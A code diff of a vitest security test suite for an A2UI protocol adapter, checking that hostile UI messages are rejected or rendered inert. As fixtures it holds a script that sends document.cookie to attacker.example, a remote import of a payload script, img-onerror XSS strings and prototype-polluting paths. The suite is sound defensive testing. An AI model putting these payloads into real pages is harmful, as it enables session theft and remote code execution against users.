@@ -1,14 +1,28 @@
 // @spec:029-adapter-a2ui
 // User Story 2 (P1): hostile protocol input fails closed. These are the
-// adversarial scenarios behind the Art. VIII guardrail — a forbidden type, an
-// undeclared action, an unknown property carrying code, active content in the
-// data model, and a hostile payload under an unmapped type. Nothing renders
-// from a rejection, and no code path opens from message data.
+// adversarial scenarios behind the Art. VIII guardrail, written in the A2UI
+// v0.9.1 message shapes (`specification/v0_9_1/json/server_to_client.json`):
+// a forbidden type, an undeclared action, an unknown property carrying code,
+// active content in the data model, a hostile payload under an unmapped type,
+// a capability function, and prototype-polluting data paths. Nothing renders
+// from a rejection and no code path opens from message data.
+import type { RenderOptions, RenderResult } from '@kimen/catalog';
+import { renderUiSpec } from '@kimen/catalog';
 import { beforeEach, describe, expect, it } from 'vitest';
 
-import { createA2uiAdapter } from '../src/index.js';
+import type { A2uiActionMessage, A2uiErrorMessage } from '../src/index.js';
+import { A2UI_BASIC_CATALOG_IDS, createA2uiAdapter } from '../src/index.js';
 
 let surface: HTMLElement;
+
+/** Activates the first element matching `selector`, failing the test when it is absent. */
+const activate = (root: Element, selector: string): void => {
+  const target = root.querySelector<HTMLElement>(selector);
+  if (target === null) {
+    throw new Error(`no ${selector} rendered`);
+  }
+  target.click();
+};
 
 beforeEach(() => {
   document.body.replaceChildren();
@@ -16,46 +30,44 @@ beforeEach(() => {
   document.body.appendChild(surface);
 });
 
-const orderSurface = () => ({
-  surfaceUpdate: {
-    surfaceId: 'checkout',
-    root: 'card',
-    components: [
-      { id: 'card', component: { Card: { children: { explicitList: ['confirm'] } } } },
-      {
-        id: 'confirm',
-        component: {
-          Button: { label: { literalString: 'Confirm order' }, action: { name: 'confirm-order' } },
-        },
-      },
-    ],
-  },
+const BASIC = A2UI_BASIC_CATALOG_IDS[0] ?? '';
+const create = (surfaceId = 's') => ({
+  version: 'v0.9.1',
+  createSurface: { surfaceId, catalogId: BASIC },
 });
+const update = (components: unknown[], surfaceId = 's') => ({
+  version: 'v0.9.1',
+  updateComponents: { surfaceId, components },
+});
+
+const button = (id: string, label: string, action: unknown) => [
+  { id, component: 'Button', child: `${id}-label`, action },
+  { id: `${id}-label`, component: 'Text', text: label },
+];
+
+const orderSurface = () =>
+  update([
+    { id: 'root', component: 'Card', child: 'confirm' },
+    ...button('confirm', 'Confirm order', { event: { name: 'confirm-order' } }),
+  ]);
 
 describe('the guardrail is a security boundary no message can bypass', () => {
   it('S7 rejects a message using a type the matrix declares forbidden', () => {
-    const adapter = createA2uiAdapter({ protocolVersion: '0.9.1', surface });
+    const adapter = createA2uiAdapter({ surface });
+    adapter.apply(create());
 
-    const result = adapter.apply({
-      surfaceUpdate: {
-        surfaceId: 's',
-        root: 'root',
-        components: [
-          { id: 'root', component: { Card: { children: { explicitList: ['evil'] } } } },
-          {
-            id: 'evil',
-            component: {
-              html: {
-                content: {
-                  literalString:
-                    "<script>fetch('https://attacker.example/'+document.cookie)</script>",
-                },
-              },
-            },
-          },
-        ],
-      },
-    });
+    const result = adapter.apply(
+      update([
+        { id: 'root', component: 'Card', child: 'title' },
+        { id: 'title', component: 'Text', text: 'Hi' },
+        // Not even reachable from root: the whole message is still rejected.
+        {
+          id: 'evil',
+          component: 'html',
+          content: "<script>fetch('https://attacker.example/'+document.cookie)</script>",
+        },
+      ]),
+    );
 
     expect(result.ok).toBe(false);
     expect(result.diagnostics.some((d) => d.rule === 'forbidden-type' && d.value === 'html')).toBe(
@@ -65,279 +77,292 @@ describe('the guardrail is a security boundary no message can bypass', () => {
   });
 
   it('S8 never dispatches an action outside the declared set', () => {
-    const adapter = createA2uiAdapter({ protocolVersion: '0.9.1', surface });
+    const events: A2uiActionMessage[] = [];
+    const adapter = createA2uiAdapter({
+      onAction: (event) => events.push(event),
+      surface,
+    });
+    adapter.apply(create());
     adapter.apply(orderSurface());
 
-    const result = adapter.apply({
-      surfaceUpdate: {
-        surfaceId: 'checkout',
-        components: [
-          {
-            id: 'card',
-            component: { Card: { children: { explicitList: ['confirm', 'export'] } } },
-          },
-          {
-            id: 'export',
-            component: {
-              Button: {
-                label: { literalString: 'Export account data' },
-                action: { name: 'export-account-data' },
-              },
-            },
-          },
-        ],
-      },
-    });
+    const result = adapter.apply(
+      update([
+        { id: 'root', component: 'Card', child: 'export' },
+        ...button('export', 'Export', {
+          event: { name: 'export-account-data' },
+        }),
+      ]),
+    );
 
     expect(result.ok).toBe(false);
-    expect(
-      result.diagnostics.some(
-        (d) => d.rule === 'undeclared-action' && d.value === 'export-account-data',
-      ),
-    ).toBe(true);
-    // The rejected re-render leaves the previous surface intact; the export
-    // button never rendered, so activating it dispatches nothing.
-    const buttons = [...surface.querySelectorAll('ki-button')];
-    expect(buttons.some((b) => b.textContent === 'Export account data')).toBe(false);
-    expect(buttons.some((b) => b.textContent === 'Confirm order')).toBe(true);
+    expect(result.diagnostics[0]).toMatchObject({
+      rule: 'undeclared-action',
+      value: 'export-account-data',
+    });
+    // The previous surface stays; activating what is rendered never yields the undeclared action.
+    activate(surface, 'ki-button');
+    expect(events.map((e) => e.action.name)).toStrictEqual(['confirm-order']);
+  });
+
+  it('S8 honours a host-declared action set from the first render', () => {
+    const adapter = createA2uiAdapter({ actions: ['confirm-order'], surface });
+    adapter.apply(create());
+
+    const result = adapter.apply(
+      update([
+        { id: 'root', component: 'Card', child: 'export' },
+        ...button('export', 'Export', {
+          event: { name: 'export-account-data' },
+        }),
+      ]),
+    );
+
+    expect(result.diagnostics[0]?.rule).toBe('undeclared-action');
+    expect(surface.childNodes).toHaveLength(0);
   });
 
   it('S9 rejects an unknown property on a catalog component', () => {
-    const adapter = createA2uiAdapter({ protocolVersion: '0.9.1', surface });
+    const adapter = createA2uiAdapter({ surface });
+    adapter.apply(create());
 
-    const result = adapter.apply({
-      surfaceUpdate: {
-        surfaceId: 's',
-        root: 'b',
-        components: [
-          {
-            id: 'b',
-            component: {
-              Button: {
-                label: { literalString: 'Go' },
-                onPointerEnter: { literalString: "import('https://attacker.example/payload.js')" },
-              },
-            },
-          },
-        ],
-      },
-    });
+    const result = adapter.apply(
+      update([
+        {
+          id: 'root',
+          component: 'Button',
+          child: 'label',
+          action: { event: { name: 'go' } },
+          onPointerEnter: "import('https://attacker.example/payload.js')",
+        },
+        { id: 'label', component: 'Text', text: 'Go' },
+      ]),
+    );
 
     expect(result.ok).toBe(false);
-    expect(
-      result.diagnostics.some((d) => d.rule === 'unknown-prop' && d.value === 'onPointerEnter'),
-    ).toBe(true);
+    expect(result.diagnostics[0]).toMatchObject({
+      rule: 'unknown-property',
+      value: 'onPointerEnter',
+    });
     expect(surface.childNodes).toHaveLength(0);
   });
 
   it('S10 renders data-model content as inert text, never as code', () => {
-    const adapter = createA2uiAdapter({ protocolVersion: '0.9.1', surface });
-    adapter.apply({
-      surfaceUpdate: {
-        surfaceId: 's',
-        root: 'card',
-        components: [
-          { id: 'card', component: { Card: { children: { explicitList: ['label'] } } } },
-          {
-            id: 'label',
-            component: { Text: { text: { path: '/label', literalString: 'initial' } } },
-          },
-        ],
-      },
-    });
+    const adapter = createA2uiAdapter({ surface });
+    adapter.apply(create());
+    adapter.apply(
+      update([
+        { id: 'root', component: 'Card', child: 'label' },
+        { id: 'label', component: 'Text', text: { path: '/label' } },
+      ]),
+    );
 
+    const payload = '<img src=x onerror=alert(document.domain)>';
     const result = adapter.apply({
-      dataModelUpdate: {
-        surfaceId: 's',
-        path: '/label',
-        contents: '<img src=x onerror=alert(document.domain)>',
-      },
+      version: 'v0.9.1',
+      updateDataModel: { surfaceId: 's', path: '/label', value: payload },
     });
 
     expect(result.ok).toBe(true);
-    const card = surface.querySelector('ki-card');
-    expect(card?.textContent).toContain('<img src=x onerror=alert(document.domain)>');
-    // The characters are inert text, never a parsed element.
+    expect(surface.textContent).toBe(payload);
     expect(surface.querySelector('img')).toBeNull();
   });
 
-  it('S11 keeps a hostile payload under an unmapped type out of the fallback', () => {
-    const adapter = createA2uiAdapter({ protocolVersion: '0.9.1', surface });
+  it('S10 reads bindings from the model own data only and refuses polluting paths', () => {
+    const adapter = createA2uiAdapter({ surface });
+    adapter.apply(create());
+    adapter.apply(
+      update([
+        { id: 'root', component: 'Card', child: 'label' },
+        { id: 'label', component: 'Text', text: { path: '/toString' } },
+      ]),
+    );
+    expect(surface.textContent).toBe('');
 
-    const result = adapter.apply({
-      surfaceUpdate: {
-        surfaceId: 's',
-        root: 'card',
-        components: [
-          { id: 'card', component: { Card: { children: { explicitList: ['weird'] } } } },
-          {
-            id: 'weird',
-            component: {
-              MysteryWidget: { content: { literalString: '<img src=x onerror=alert(1)>' } },
-            },
-          },
-        ],
-      },
-    });
-
-    expect(result.ok).toBe(true);
-    // The declared fallback rendered, carrying only its constant label...
-    expect(surface.querySelector('ki-badge')?.textContent).toBe('Unsupported component');
-    // ...and no agent-supplied content reached the DOM.
-    expect(surface.querySelector('img')).toBeNull();
-    expect(surface.textContent).not.toContain('onerror');
-  });
-});
-
-// Hardening beyond the frozen scenarios: the adapter is the security boundary
-// for untrusted runtime data (Codex review of PR #59). Hostile envelopes,
-// prototype-polluting paths, cyclic graphs, non-transactional state and
-// off-tree forbidden types all fail closed.
-describe('the adapter treats every message as hostile runtime data', () => {
-  let adapter: ReturnType<typeof createA2uiAdapter>;
-  const adapterApply = (message: unknown): ReturnType<typeof adapter.apply> =>
-    adapter.apply(message as Parameters<typeof adapter.apply>[0]);
-  const orderSurfaceOnly = (): ReturnType<typeof adapter.apply> =>
-    adapterApply({
-      surfaceUpdate: {
-        surfaceId: 'checkout',
-        root: 'card',
-        components: [
-          { id: 'card', component: { Card: { children: { explicitList: ['confirm'] } } } },
-          {
-            id: 'confirm',
-            component: {
-              Button: {
-                label: { literalString: 'Confirm order' },
-                action: { name: 'confirm-order' },
-              },
-            },
-          },
-        ],
-      },
-    });
-
-  beforeEach(() => {
-    adapter = createA2uiAdapter({ protocolVersion: '0.9.1', surface });
-  });
-
-  it('rejects a prototype-polluting data-model path without touching Object.prototype', () => {
-    orderSurfaceOnly();
-    const result = adapterApply({
-      dataModelUpdate: { surfaceId: 'checkout', path: '/__proto__/polluted', contents: 'x' },
-    });
-
-    expect(result.ok).toBe(false);
-    expect(result.diagnostics.some((d) => d.rule === 'forbidden-key')).toBe(true);
-    expect(({} as Record<string, unknown>)['polluted']).toBeUndefined();
-  });
-
-  it('resolves a bound path against own data only, never an inherited property', () => {
-    // The write path already refuses prototype-polluting keys (above), but the
-    // READ path walked with plain property access — which follows the prototype
-    // chain. The surface renders into a page the adapter does not own: anything
-    // already on `Object.prototype` there is readable by a bound path, so a
-    // message could show text that never entered the data model.
-    Object.defineProperty(Object.prototype, 'kimenInherited', {
-      configurable: true,
-      enumerable: false,
-      value: 'INHERITED VALUE',
-      writable: true,
-    });
-
-    try {
-      for (const path of ['/kimenInherited', '/__proto__/kimenInherited']) {
-        const result = adapterApply({
-          surfaceUpdate: {
-            surfaceId: 'checkout',
-            root: 'card',
-            components: [
-              { id: 'card', component: { Card: { children: { explicitList: ['confirm'] } } } },
-              {
-                id: 'confirm',
-                component: {
-                  Button: {
-                    label: { path, literalString: 'Confirm order' },
-                    action: { name: 'confirm-order' },
-                  },
-                },
-              },
-            ],
-          },
-        });
-
-        expect(result.ok).toBe(true);
-        // The path resolves to nothing, so the declared literal seed wins.
-        expect(surface.textContent).not.toContain('INHERITED VALUE');
-        expect(surface.querySelector('ki-button')?.textContent).toBe('Confirm order');
-      }
-    } finally {
-      Reflect.deleteProperty(Object.prototype, 'kimenInherited');
+    for (const path of ['/__proto__/polluted', '/a/constructor/prototype', '/x/prototype']) {
+      const result = adapter.apply({
+        version: 'v0.9.1',
+        updateDataModel: { surfaceId: 's', path, value: 'yes' },
+      });
+      expect(result.ok).toBe(false);
+      expect(result.diagnostics[0]?.rule).toBe('forbidden-key');
     }
+    expect(({} as Record<string, unknown>)['polluted']).toBeUndefined();
+
+    const bound = adapter.apply(
+      update([
+        {
+          id: 'label',
+          component: 'Text',
+          text: { path: '/__proto__/polluted' },
+        },
+      ]),
+    );
+    expect(bound.diagnostics[0]?.rule).toBe('forbidden-key');
   });
 
-  it('rolls a failed incremental update back out of surface state', () => {
-    orderSurfaceOnly();
-    // A rejected update (undeclared action) must not linger in state.
-    const rejected = adapterApply({
-      surfaceUpdate: {
-        surfaceId: 'checkout',
-        components: [
-          { id: 'card', component: { Card: { children: { explicitList: ['confirm', 'evil'] } } } },
-          { id: 'evil', component: { Button: { action: { name: 'exfiltrate' } } } },
-        ],
-      },
+  it('S11 never lets a hostile payload under an unmapped type reach the fallback', () => {
+    const adapter = createA2uiAdapter({ surface });
+    adapter.apply(create());
+
+    const result = adapter.apply(
+      update([
+        { id: 'root', component: 'Card', child: 'video' },
+        {
+          id: 'video',
+          component: 'Video',
+          url: '<img src=x onerror=alert(1)>',
+        },
+      ]),
+    );
+
+    expect(result.ok).toBe(true);
+    expect(surface.textContent).toBe('Unsupported component');
+    expect(surface.innerHTML).not.toContain('onerror');
+    expect(surface.querySelector('img')).toBeNull();
+  });
+
+  it('S12 sends every render call to the guarded renderer alone', () => {
+    const calls: unknown[] = [];
+    const observed: MutationRecord[] = [];
+    const observer = new MutationObserver((records) => observed.push(...records));
+    const double = (input: unknown, options: RenderOptions): RenderResult => {
+      calls.push(input);
+      return renderUiSpec(input, options);
+    };
+    const adapter = createA2uiAdapter({ render: double, surface });
+    observer.observe(surface, { childList: true, subtree: true });
+
+    adapter.apply(create());
+    adapter.apply(
+      update([
+        { id: 'root', component: 'Column', children: ['a', 'b'] },
+        { id: 'a', component: 'Text', text: 'A' },
+        { id: 'b', component: 'NotInCatalog', text: '<b>x</b>' },
+      ]),
+    );
+    adapter.apply({
+      version: 'v0.9.1',
+      updateDataModel: { surfaceId: 's', path: '/k', value: 1 },
     });
-    expect(rejected.ok).toBe(false);
+    adapter.apply({ version: 'v0.9.1', deleteSurface: { surfaceId: 's' } });
+    observed.push(...observer.takeRecords());
+    observer.disconnect();
 
-    // A later re-render succeeds and shows no trace of the rejected components.
-    const rerender = adapterApply({ dataModelUpdate: { surfaceId: 'checkout', contents: {} } });
-    expect(rerender.ok).toBe(true);
-    const buttons = [...surface.querySelectorAll('ki-button')];
-    expect(buttons).toHaveLength(1);
-    expect(buttons[0]?.textContent).toBe('Confirm order');
+    // Two renders (updateComponents, updateDataModel); create/delete render nothing.
+    expect(calls).toHaveLength(2);
+    expect(surface.querySelector('b')).toBeNull();
+    expect(observed.length).toBeGreaterThan(0);
   });
 
-  it('returns a diagnostic for a malformed message instead of throwing', () => {
-    expect(() => adapterApply(null)).not.toThrow();
-    expect(adapterApply(null).ok).toBe(false);
-    const nonArray = adapterApply({ surfaceUpdate: { surfaceId: 's', components: 'nope' } });
-    expect(nonArray.ok).toBe(false);
-    expect(nonArray.diagnostics.some((d) => d.rule === 'malformed-message')).toBe(true);
-  });
+  it('S17 refuses a client function that reaches a browser capability', () => {
+    const adapter = createA2uiAdapter({ surface });
+    adapter.apply(create());
 
-  it('rejects a cyclic component graph before the stack overflows', () => {
-    const result = adapterApply({
-      surfaceUpdate: {
-        surfaceId: 's',
-        root: 'card',
-        components: [{ id: 'card', component: { Card: { children: { explicitList: ['card'] } } } }],
-      },
+    // Action.functionCall with openUrl (catalog.json `openUrl`): allowlist is empty.
+    const viaAction = adapter.apply(
+      update([
+        { id: 'root', component: 'Card', child: 'go' },
+        ...button('go', 'Open', {
+          functionCall: {
+            call: 'openUrl',
+            args: { url: 'https://attacker.example/' },
+          },
+        }),
+      ]),
+    );
+    expect(viaAction.ok).toBe(false);
+    expect(viaAction.diagnostics[0]).toMatchObject({
+      rule: 'forbidden-function',
+      value: 'openUrl',
     });
 
-    expect(result.ok).toBe(false);
-    expect(result.diagnostics.some((d) => d.rule === 'cycle')).toBe(true);
+    // The same function in a value position is refused too.
+    const viaValue = adapter.apply(
+      update([
+        { id: 'root', component: 'Card', child: 't' },
+        {
+          id: 't',
+          component: 'Text',
+          text: { call: 'openUrl', args: { url: 'https://attacker.example/' } },
+        },
+      ]),
+    );
+    expect(viaValue.diagnostics[0]).toMatchObject({
+      rule: 'forbidden-function',
+      value: 'openUrl',
+    });
     expect(surface.childNodes).toHaveLength(0);
   });
 
-  it('rejects a forbidden type even when it is off the rendered tree', () => {
-    const result = adapterApply({
-      surfaceUpdate: {
-        surfaceId: 's',
-        root: 'card',
-        components: [
-          { id: 'card', component: { Card: { children: { explicitList: ['confirm'] } } } },
-          { id: 'confirm', component: { Button: { label: { literalString: 'OK' } } } },
-          // Never referenced by root, but present in the update:
-          { id: 'evil', component: { html: { content: { literalString: '<script>x</script>' } } } },
-        ],
-      },
+  it('S19 reports a rejected message to the agent as a VALIDATION_FAILED error', () => {
+    const errors: A2uiErrorMessage[] = [];
+    const adapter = createA2uiAdapter({
+      onError: (error) => errors.push(error),
+      surface,
     });
+    adapter.apply(create());
 
-    expect(result.ok).toBe(false);
-    expect(result.diagnostics.some((d) => d.rule === 'forbidden-type' && d.value === 'html')).toBe(
-      true,
+    adapter.apply(update([{ id: 'root', component: 'Card', child: 'x', style: 'color:red' }]));
+
+    expect(errors).toStrictEqual([
+      {
+        version: 'v0.9.1',
+        error: {
+          code: 'VALIDATION_FAILED',
+          surfaceId: 's',
+          path: '/components/root/style',
+          message: 'Card does not declare the property "style"',
+        },
+      },
+    ]);
+  });
+
+  it('fails closed on malformed envelopes, cycles and pathological depth', () => {
+    const adapter = createA2uiAdapter({ surface });
+    adapter.apply(create());
+
+    for (const message of [
+      null,
+      'text',
+      { version: 'v0.9.1' },
+      {
+        version: 'v0.9.1',
+        updateComponents: { surfaceId: 's', components: [] },
+      },
+      {
+        version: 'v0.9.1',
+        updateComponents: { surfaceId: 's', components: [{ id: 'root' }] },
+      },
+      {
+        version: 'v0.9.1',
+        createSurface: { surfaceId: 'x', catalogId: BASIC },
+        deleteSurface: { surfaceId: 'x' },
+      },
+      {
+        version: 'v0.9.1',
+        updateDataModel: { surfaceId: 's', path: 'relative', value: 1 },
+      },
+      { version: 'v0.9.1', updateDataModel: { surfaceId: 's', contents: [] } },
+    ]) {
+      const result = adapter.apply(message);
+      expect(result.ok).toBe(false);
+      expect(result.diagnostics[0]?.rule).toBe('malformed-message');
+    }
+
+    const cycle = adapter.apply(
+      update([
+        { id: 'root', component: 'Card', child: 'a' },
+        { id: 'a', component: 'Card', child: 'root' },
+      ]),
     );
+    expect(cycle.diagnostics[0]?.rule).toBe('cycle');
+
+    const deep = Array.from({ length: 300 }, (_, index) => ({
+      id: index === 0 ? 'root' : `n${String(index)}`,
+      component: 'Card',
+      child: `n${String(index + 1)}`,
+    }));
+    expect(adapter.apply(update(deep)).diagnostics[0]?.rule).toBe('depth-budget');
     expect(surface.childNodes).toHaveLength(0);
   });
 });
